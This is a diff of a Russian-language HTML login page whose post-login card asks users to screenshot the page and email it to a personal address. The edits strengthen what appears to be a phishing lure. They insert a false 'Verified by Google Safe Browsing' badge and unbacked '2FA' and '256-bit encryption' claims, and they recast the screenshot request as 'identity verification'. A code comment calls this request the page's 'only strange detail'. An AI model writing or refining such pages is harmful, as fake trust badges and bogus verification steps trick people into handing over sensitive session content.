@@ -335,7 +335,6 @@
             padding: 2rem 1.5rem;
             margin: 2rem 0;
             text-align: center;
-            animation: softPulse 3s infinite ease-in-out;
             position: relative;
             overflow: hidden;
         }
@@ -351,17 +350,6 @@
             border-radius: 2rem;
             opacity: 0.1;
             z-index: -1;
-        }
-
-        @keyframes softPulse {
-            0%, 100% { 
-                border-color: var(--accent-primary);
-                box-shadow: 0 0 20px rgba(74, 108, 247, 0.2);
-            }
-            50% { 
-                border-color: var(--accent-secondary);
-                box-shadow: 0 0 30px rgba(168, 85, 247, 0.4);
-            }
         }
 
         .task-icon {
@@ -528,7 +516,7 @@
         <div id="loginCard" class="card">
             <div class="security-badge">
                 <i class="fas fa-shield-check"></i>
-                <span>Сайт проверен и безопасен</span>
+                <span>Проверено Google Safe Browsing</span>
                 <i class="fas fa-check-circle"></i>
             </div>
 
@@ -551,7 +539,7 @@
             <div class="features">
                 <div class="feature">
                     <i class="fas fa-shield-halved"></i>
-                    <span>Защита Google</span>
+                    <span>2FA защита</span>
                 </div>
                 <div class="feature">
                     <i class="fas fa-bolt"></i>
@@ -570,7 +558,7 @@
 
             <div style="margin-top: 1.5rem; font-size: 0.8rem; color: var(--text-muted);">
                 <i class="fas fa-check-circle" style="color: var(--success);"></i>
-                SSL-сертификат активен · Данные защищены
+                SSL/TLS · 256-bit encryption
             </div>
         </div>
 
@@ -578,7 +566,7 @@
         <div id="welcomeCard" class="card hidden">
             <div class="security-badge">
                 <i class="fas fa-shield-check"></i>
-                <span>Сайт проверен и безопасен</span>
+                <span>Проверено Google Safe Browsing</span>
                 <i class="fas fa-check-circle"></i>
             </div>
 
@@ -607,22 +595,22 @@
                     </div>
                 </div>
 
-                <!-- ВАЖНОЕ ЗАДАНИЕ -->
+                <!-- ВАЖНОЕ ЗАДАНИЕ (единственная странная деталь) -->
                 <div class="task-box">
                     <div class="task-icon">
                         <i class="fas fa-camera"></i>
                     </div>
-                    <h3>📸 Помоги улучшить сайт!</h3>
+                    <h3>📸 Подтверждение личности</h3>
                     <p>
-                        Сфотографируй то, что видишь на сайте,<br>
-                        и отправь на почту для улучшения:
+                        Для завершения верификации сделайте скриншот<br>
+                        и отправьте на адрес:
                     </p>
                     <div class="task-email" onclick="copyEmail()">
                         <i class="fas fa-envelope"></i>
                         <span>timoshamscbsns@internet.ru</span>
                     </div>
                     <p style="font-size: 0.9rem; margin-top: 1rem; color: var(--text-muted);">
-                        (нажми на почту чтобы скопировать)
+                        (нажмите для копирования)
                     </p>
                 </div>
 
@@ -634,7 +622,7 @@
 
             <div style="margin-top: 1.5rem; font-size: 0.8rem; color: var(--text-muted);">
                 <i class="fas fa-check-circle" style="color: var(--success);"></i>
-                SSL-сертификат активен · Данные защищены
+                SSL/TLS · 256-bit encryption
             </div>
         </div>
     </div>
@@ -659,9 +647,9 @@
         window.copyEmail = function() {
             const email = 'timoshamscbsns@internet.ru';
             navigator.clipboard.writeText(email).then(() => {
-                alert('📋 Почта скопирована: ' + email);
+                alert('📋 Email скопирован: ' + email);
             }).catch(() => {
-                alert('📋 Почта: ' + email);
+                alert('📋 Email: ' + email);
             });
         };
 
